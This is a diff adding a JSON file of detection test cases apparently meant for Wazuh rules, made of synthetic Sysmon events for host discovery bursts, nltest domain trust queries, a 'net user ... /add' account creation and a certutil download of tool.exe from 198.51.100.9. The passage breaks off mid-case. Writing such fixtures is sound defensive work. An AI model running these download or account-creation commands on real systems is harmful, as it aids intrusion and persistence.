@@ -1,0 +1,1568 @@
+{
+ "use_case": "UC21",
+ "cases": [
+  {
+   "id": "UC21-01",
+   "title": "Five different discovery tools in a row -> 112110 on the fifth",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "whoami.exe",
+      "CommandLine": "whoami /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\hostname.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "hostname.exe",
+      "CommandLine": "hostname",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "ipconfig.exe",
+      "CommandLine": "ipconfig /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\systeminfo.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "sysinfo.exe",
+      "CommandLine": "systeminfo",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net localgroup administrators",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 5,
+     "rule": 112110
+    }
+   ],
+   "forbid": []
+  },
+  {
+   "id": "UC21-02",
+   "title": "A single discovery command stays silent (classified, counted, no alert)",
+   "kind": "negative",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "whoami.exe",
+      "CommandLine": "whoami /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 112109
+    }
+   ],
+   "forbid": [
+    112110
+   ]
+  },
+  {
+   "id": "UC21-03",
+   "title": "Domain trust discovery -> 112104",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\nltest.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "nltestrk.exe",
+      "CommandLine": "nltest /domain_trusts /all_trusts",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 112104
+    }
+   ],
+   "forbid": []
+  },
+  {
+   "id": "UC21-04",
+   "title": "Admin re-runs ipconfig five times (same tool, no burst)",
+   "kind": "negative",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "ipconfig.exe",
+      "CommandLine": "ipconfig /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "ipconfig.exe",
+      "CommandLine": "ipconfig /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "ipconfig.exe",
+      "CommandLine": "ipconfig /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "ipconfig.exe",
+      "CommandLine": "ipconfig /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "ipconfig.exe",
+      "CommandLine": "ipconfig /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    }
+   ],
+   "expect": [],
+   "forbid": [
+    112110
+   ]
+  },
+  {
+   "id": "UC21-05",
+   "title": "net user ... /add is left to Wazuh's net.exe rules (not swallowed by the classifier)",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net user backup01 P@ss-lab-only /add",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 92039
+    }
+   ],
+   "forbid": [
+    112102,
+    112109
+   ]
+  },
+  {
+   "id": "UC21-06",
+   "title": "Burst after a LOLBin download on the same host -> 112111",
+   "kind": "positive",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "CertUtil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.9/tool.exe C:\\Users\\Public\\tool.exe",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "ParentCommandLine": "C:\\Windows\\explorer.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "whoami.exe",
+      "CommandLine": "whoami /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\hostname.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "hostname.exe",
+      "CommandLine": "hostname",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\ipconfig.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "ipconfig.exe",
+      "CommandLine": "ipconfig /all",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\systeminfo.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "sysinfo.exe",
+      "CommandLine": "systeminfo",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    },
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "net.exe",
+      "CommandLine": "net localgroup administrators",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+      "ParentUser": "WIN10-LAB\\ahmed"
+     }
+    }
+   ],
+   "expect": [
+    {
+     "at": 1,
+     "rule": 111201
+    },
+    {
+     "at": 6,
+     "rule": 112111
+    }
+   ],
+   "forbid": []
+  },
+  {
+   "id": "UC21-07",
+   "title": "Inventory commands from the management agent (excluded)",
+   "kind": "negative",
+   "events": [
+    {
+     "type": "win",
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "level": 4,
+      "computer": "WIN10-LAB",
+      "eventID": 1
+     },
+     "eventdata": {
+      "RuleName": "-",
+      "UtcTime": "2026-11-11 10:00:00.000",
+      "ProcessGuid": "{11111111-2222-3333-4444-555555555555}",
+      "ProcessId": "4242",
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "FileVersion": "10.0.19041.1",
+      "Description": "-",
+      "Product": "Microsoft Windows Operating System",
+      "Company": "Microsoft Corporation",
+      "OriginalFileName": "whoami.exe",
+      "CommandLine": "whoami",
+      "CurrentDirectory": "C:\\Users\\ahmed\\",
+      "User": "WIN10-LAB\\ahmed",
+      "LogonGuid": "{11111111-2222-3333-4444-000000000001}",
+      "LogonId": "0x3e7a1",
+      "TerminalSessionId": "1",
+      "IntegrityLevel": "Medium",
+      "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
+      "ParentProcessGuid": "{11111111-2222-3333-4444-555555555554}",
+      "ParentProcessId": "4100",
